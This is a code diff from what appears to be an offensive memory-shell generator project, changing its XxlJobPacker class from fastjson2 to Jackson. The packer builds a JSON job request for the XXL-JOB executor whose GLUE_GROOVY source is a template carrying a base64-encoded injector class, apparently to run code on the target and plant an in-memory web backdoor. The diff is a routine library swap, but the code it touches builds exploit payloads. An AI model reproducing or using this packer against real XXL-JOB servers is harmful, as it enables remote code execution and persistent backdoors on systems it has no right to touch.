@@ -1,12 +1,15 @@
 package com.reajason.javaweb.memshell.packer;
 
-import com.alibaba.fastjson2.JSONObject;
-import com.alibaba.fastjson2.JSONWriter;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.fasterxml.jackson.databind.SerializationFeature;
 import com.reajason.javaweb.memshell.config.GenerateResult;
+import lombok.SneakyThrows;
 import org.apache.commons.io.IOUtils;
 
 import java.io.IOException;
 import java.nio.charset.Charset;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.Objects;
 
 /**
@@ -25,23 +28,26 @@ public class XxlJobPacker implements Packer {
     }
 
     @Override
+    @SneakyThrows
     public String pack(GenerateResult generateResult) {
         String source = template
                 .replace("{{base64Str}}", generateResult.getInjectorBytesBase64Str())
                 .replace("{{className}}", generateResult.getInjectorClassName());
-        JSONObject jsonObject = new JSONObject();
-        jsonObject.put("jobId", 1);
-        jsonObject.put("executorHandler", "demoJobHandler");
-        jsonObject.put("executorParams", "demoJobHandler");
-        jsonObject.put("executorBlockStrategy", "COVER_EARLY");
-        jsonObject.put("executorTimeout", 0);
-        jsonObject.put("logId", 1);
-        jsonObject.put("logDateTime", System.currentTimeMillis());
-        jsonObject.put("glueType", "GLUE_GROOVY");
-        jsonObject.put("glueSource", source);
-        jsonObject.put("glueUpdatetime", System.currentTimeMillis());
-        jsonObject.put("broadcastIndex", 0);
-        jsonObject.put("broadcastTotal", 0);
-        return JSONObject.toJSONString(jsonObject, JSONWriter.Feature.PrettyFormat);
+        Map<String, Object> map = new HashMap<>();
+        map.put("jobId", 1);
+        map.put("executorHandler", "demoJobHandler");
+        map.put("executorParams", "demoJobHandler");
+        map.put("executorBlockStrategy", "COVER_EARLY");
+        map.put("executorTimeout", 0);
+        map.put("logId", 1);
+        map.put("logDateTime", System.currentTimeMillis());
+        map.put("glueType", "GLUE_GROOVY");
+        map.put("glueSource", source);
+        map.put("glueUpdatetime", System.currentTimeMillis());
+        map.put("broadcastIndex", 0);
+        map.put("broadcastTotal", 0);
+        ObjectMapper objectMapper = new ObjectMapper();
+        objectMapper.enable(SerializationFeature.INDENT_OUTPUT); // 美化输出
+        return objectMapper.writeValueAsString(map);
     }
 }
